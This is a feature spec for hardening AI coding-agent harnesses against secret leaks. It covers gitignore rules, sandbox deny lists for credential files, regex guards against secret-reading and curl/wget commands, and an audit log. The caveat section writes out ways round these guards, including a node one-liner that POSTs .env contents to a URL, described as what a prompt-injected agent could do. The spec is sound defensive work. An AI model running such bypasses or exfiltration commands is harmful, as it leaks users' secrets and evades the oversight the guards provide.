---
title: Security Hardening — Feature Spec
feature: security-hardening
flow: templates
layer: scaffold
status: active
lang: en
related: [features/claude-harness/claude-harness.spec.en.md]
keywords: [securityhardening, denyread, sensitivefilepatterns, secretreadguard, networkegress, auditlog, gitignore, failclosed, envfiles, credentialspatterns]
updated: 2026-07-04
---

# Security Hardening — Feature Spec

## Context

Scaffolded beaver projects and this repo's dogfooded harness originally leaked environment secrets through multiple channels: generated `.gitignore` templates did not exclude `.env` files, Claude's `sandbox.filesystem.denyRead` globs were narrow, Codex had no secret-read or network-egress protection at all, and guard denials went unlogged. These gaps create accident-prone defaults where secrets can be committed, read by agents, or exfiltrated without detection.

## Root Cause / Key Finding

The scaffold templates treated secret-file protection as afterthought configuration rather than a first-class default. Environment variables (`.env`, `.env.local`, `.env.*.local`) were never explicitly ignored in generated projects, relying on developer memory to add them post-scaffold. Claude's file-read sandbox was narrowly scoped (`.env` only), Codex had no equivalent guard, and the two harnesses could not share sensitive-path definitions — leaving them free to drift.

Additionally, guard decisions (write-scope ACL denials, secret-read denials, network-egress denials) happened silently — no audit trail meant denials could only be discovered through interactive testing or failure reproduction, not visibility into what was actually blocked.

## Solution / Pattern

### Gitignore Template: .env, .env.*, and Audit Log

Scaffolded projects and this repo's dogfood `.gitignore` now include an explicit `# Environment variables` section:

```
.env
.env.local
.env.*.local
!.env.example
.agents/audit.log
```

This ensures:
- `.env` files are never accidentally committed (and resurfaced in history via git reflog).
- `.env.example` is trackable for team sharing of required keys.
- `.agents/audit.log` (the guard audit trail, see below) remains local-only and untracked.
- The same template is shared by all scaffolable project types (react-vite, chrome-extension) — one source, both emit identically.

### Claude: Expanded sandbox.filesystem.denyRead

Claude's sandboxed file-read protection is configured via `sandbox.filesystem.denyRead` in `.claude/settings.json` (both scaffolded and dogfood instances). The 8-entry deny list is derived from a single source, `SENSITIVE_FILE_PATTERNS`, in `src/scaffold/shared/claude-setup.ts`:

```javascript
const SENSITIVE_FILE_PATTERNS = [
  "**/.env",
  "**/.env.*",
  "**/*.pem",
  "**/*.key",
  "**/credentials*",
  "**/secrets*",
  "~/.ssh/**",
  "~/.aws/**"
];
```

**In `.claude/settings.json`:**
```json
{
  "sandbox": {
    "filesystem": {
      "denyRead": [
        "**/.env",
        "**/.env.*",
        "**/*.pem",
        "**/*.key",
        "**/credentials*",
        "**/secrets*",
        "~/.ssh/**",
        "~/.aws/**"
      ]
    }
  }
}
```

These globs block Claude from reading:
- `.env` and variant files (environment configuration)
- `.pem` and `.key` files (TLS/SSH keys)
- Files named `credentials*` or `secrets*` (generic secret holders)
- System credential stores at `~/.ssh/` and `~/.aws/` (home-directory keys and config)

The `~/` prefix is [officially supported](https://code.claude.com/docs/en/sandboxing) by Claude Code's sandbox glob matcher and expands to the user's home directory at enforcement time.

### Codex: Shared SECRET_READ_PATTERNS Guard

Codex lacks a native sandbox, so secret-read protection is enforced by a guard script hook (`codex-permission-guard.mjs`). To prevent the Claude and Codex secret-file lists from drifting independently, both harnesses derive their patterns from the same `SENSITIVE_FILE_PATTERNS` source via a helper function in `src/scaffold/shared/claude-setup.ts`, `buildCodexSecretFileTargetSource()`, which converts glob syntax (e.g., `**/.env`, `~/.aws/**`) to regex metacharacter-escaped fragments (e.g., `\.env`, `\.aws/`).

**Codex SECRET_READ_PATTERNS group** (in `.codex/scripts/codex-permission-guard.mjs` and its scaffold-template twin):

```javascript
const SECRET_READ_PATTERNS = [
  // Derived from SENSITIVE_FILE_PATTERNS; matches commands that read secret files
  /\b(?:cat|less|head|tail|grep|sed|awk|strings)\s+[^\s]*(?:\.env|\.env\.|\.pem|\.key|credentials|secrets|\.ssh|\.aws)/,
  // Bare environment dump (no arguments)
  /^\s*(?:printenv|env)\s*$/
];
```

The guard denies any command matching `SECRET_READ_PATTERNS` at the regex-match level (**fail-closed**), preventing:
- Text-file readers (`cat`, `less`, `head`, `tail`) with sensitive-file arguments
- Grep/sed/awk/strings on secret files
- Bare `printenv` or `env` (which dumps the entire environment, potentially including injected secrets)

**Fail-closed design:** A match unconditionally denies, favoring false positives (agent must ask user to run one command manually) over false negatives (silent secret leak). The rationale: false positives are reversible and discoverable; false negatives are not.

### Network Egress: ask (Claude) vs. deny (Codex)

Network commands (`curl`, `wget`, `Invoke-WebRequest`) can silently exfiltrate file contents or environment variables to external hosts without user awareness.

**Claude: `permissions.ask` tier** (in `.claude/settings.json`):
```json
{
  "permissions": {
    "ask": [
      "Bash(curl*)",
      "Bash(wget*)",
      "Bash(Invoke-WebRequest*)"
    ]
  }
}
```

When an agent issues a network command, Claude Code prompts the user for approval before execution. The user can review the command and its arguments before approving, denying, or canceling.

**Codex: NETWORK_EGRESS_PATTERNS deny** (in `.codex/scripts/codex-permission-guard.mjs`):

Codex has no interactive "ask" tier in its hook protocol, so network commands are unconditionally denied via a third pattern group:

```javascript
const NETWORK_EGRESS_PATTERNS = [
  /\b(?:curl|wget)\b/,
  /\bInvoke-WebRequest\b/
];
```

**Claude/Codex Asymmetry (Documented):** Claude users see an approval prompt and can override it; Codex agents cannot make network calls at all (stricter, but safe). This is a deliberate trade-off — the absence of an interactive "ask" hook in Codex means we default to the safer (deny) fallback rather than silently proceeding.

### Guard Audit Log: .agents/audit.log

All guard-mediated denials append one line to `.agents/audit.log` (gitignored, local-only):

```
2026-07-04T14:32:18.045Z | planner | deny | agent 'planner' attempted write to 'src/index.ts' (outside writeScope 'plans/')
2026-07-04T14:32:25.123Z | unknown | deny | command attempted secret-file read: cat .env
2026-07-04T14:32:31.456Z | unknown | deny | network egress denied: curl https://external.com/upload
```

**Format:** `<ISO 8601 timestamp> | <agent_type or "unknown"> | deny | <reason, truncated to 150 chars>`

The audit log is populated by a standalone `scripts/audit-log.mjs` helper wired into three deny call sites:
1. `.claude/scripts/agent-guard.mjs` (write-scope ACL denials) — logs with `agent_type` from the hook payload
2. `.codex/scripts/agent-guard-codex.mjs` (write-scope ACL denials) — logs with `agent_type` from the SubagentStart temp file
3. `.codex/scripts/codex-permission-guard.mjs` (secret-read, network-egress, git denials) — logs with `agent_type: 'unknown'` (Codex PreToolUse payloads carry no agent identity)

The helper creates `.agents/` on first write (via `mkdirSync(..., { recursive: true })`) and wraps all file I/O in try/catch so logging failures never break the guard itself.

**Hard Limitation:** Claude's native `permissions.deny` (static lists in settings.json) and `sandbox.filesystem.denyRead` (file sandbox) are enforced inside Claude Code itself with no hook firing — these denials are **never logged**. Only guard-script-mediated denials (write-scope ACL, codex-permission-guard.mjs patterns) appear in the audit log. This is a documented limitation, not a bug.

## Key Decisions

### What This Is NOT (Prominent Caveat)

**These measures are accident-prevention and defense-in-depth, NOT a security boundary.**

- **Not sandboxing.** A regex-matched deny on `cat .env` can be bypassed by reading the file through an alternative binary (`xxd`, `od`, `strings` on memory) or `node -e "require('fs').readFileSync('.env')"` or piping through a variable. The guards heuristically block the most common accidental reads, not all possible reads.
- **Not anti-exfiltration.** An adversarial or prompt-injected agent can still exfiltrate secrets via unguarded binaries (e.g., `node -e "fetch(url, {method: 'POST', body: require('fs').readFileSync('.env')})"`) or by encoding output as part of normal task completion. The network-egress patterns block `curl`/`wget` directly, not all possible network I/O.
- **Not unbypassable.** A fully compromised or adversarially-prompted agent can enumerate the guards and work around them. The real security boundary lives at the OS and sandbox level, not in our regex heuristics.

**The actual value:** These guards catch the common accidental cases — a distracted developer, a prompt that naively tries `cat .env`, an agent that defaults to `curl` for a network call — without blocking normal development. They are one layer of defense-in-depth, not the only layer.

### Single Source of Truth: SENSITIVE_FILE_PATTERNS

To prevent the Claude and Codex secret-file lists from drifting, both are derived from `SENSITIVE_FILE_PATTERNS`, a TS-level array in `src/scaffold/shared/claude-setup.ts`. This is the single source of truth; changes to sensitive-path coverage must edit this one array, and both `claudeSettingsTemplate()` (which renders `denyRead`) and `buildCodexSecretFileTargetSource()` (which generates Codex regex fragments) automatically stay in sync.

**Why this matters:** If `.claude/settings.json` and `.codex/scripts/codex-permission-guard.mjs` were edited separately, they would inevitably drift over time — one would add `.pem` files and the other wouldn't, or one would forget `~/.aws/` — leaving blind spots in the less-frequently-reviewed harness.

### Fail-Closed vs. Fail-Open

- **Secret-read (`SECRET_READ_PATTERNS`):** Fail-closed at the pattern-matching level. Any command matching a secret-read pattern is unconditionally denied. The JSON-parse failure path (if Codex's hook payload is malformed) is fail-open, but this is a non-path in practice — the hook invocation is internal to Codex, not user-supplied JSON. Rationale: false positives (agent must ask user to run a read manually) are far less costly than false negatives (silent secret leak).
- **Network egress (`NETWORK_EGRESS_PATTERNS`):** Codex denies on match (fail-closed); Claude prompts (ask tier, user override). Rationale: same as secret-read — safer to block and ask the user than to silently allow.
- **Git commands (`DENY_PATTERNS`):** Fail-open on JSON parse (unchanged from prior design). Rationale: the git-command guard is legacy and narrow (only blocks direct `git push`, not all git operations); the parse-error fallback is accept-and-proceed to avoid false blocks on malformed payloads.

The split fail-modes (fail-closed for secret/network, fail-open for git on parse error) is intentional: the guards are ordered (git, then secret, then network), so a command matching secret or network still gets a deny reason even if later logic fails.

### Gitignore: Shared Template, Scope

Both react-vite and chrome-extension scaffolds use the same `gitignoreTemplate()` from `src/scaffold/react-vite/templates/gitignore.ts`, so `.env` and audit-log exclusions are automatically applied to both. Future project types that re-use the same template also inherit this behavior with no additional edits.

The template itself is static (no cart-conditional sections), keeping it maintenance-free: environment variables should be ignored unconditionally, regardless of project configuration.

### Audit Log Rotation and Retention

The audit log (`scripts/audit-log.mjs`) appends indefinitely — no rotation, no cleanup, no configurability. This is an accepted trade-off:
- **Pro:** Simplicity; long-lived projects accumulate a diagnostic trail without explicit management.
- **Con:** The log grows unbounded; projects with many guard denials will accumulate noise.

Rotation and retention are speculative requirements (not in the original plan) and are deferred to future work if they become a pain point. For now, the log is local-only and gitignored, so the noise is not shared or persisted in version control.

## Related Files

- `src/scaffold/shared/claude-setup.ts` — `SENSITIVE_FILE_PATTERNS` single source, `claudeSettingsTemplate()`, `codexPermissionGuardMjsTemplate()`, `buildCodexSecretFileTargetSource()`
- `src/scaffold/react-vite/templates/gitignore.ts` — `.gitignore` template (shared by react-vite and chrome-extension)
- `.claude/settings.json` — Dogfood Claude harness config (mirrors scaffold template, same `denyRead` and `ask` arrays)
- `.codex/scripts/codex-permission-guard.mjs` — Dogfood Codex guard (mirrors scaffold template, same pattern groups)
- `scripts/audit-log.mjs` — Shared audit-log helper (imported by both Claude and Codex guard adapters)
- `.claude/scripts/agent-guard.mjs` — Claude write-scope ACL guard (calls `appendAuditLog`)
- `.codex/scripts/agent-guard-codex.mjs` — Codex write-scope ACL guard (calls `appendAuditLog`)
- `plans/security-hardening/` — Implementation phases (01 scaffold-gitignore, 02 claude-denyread, 03 shared-secret-guard, 04 network-egress, 05 audit-log)
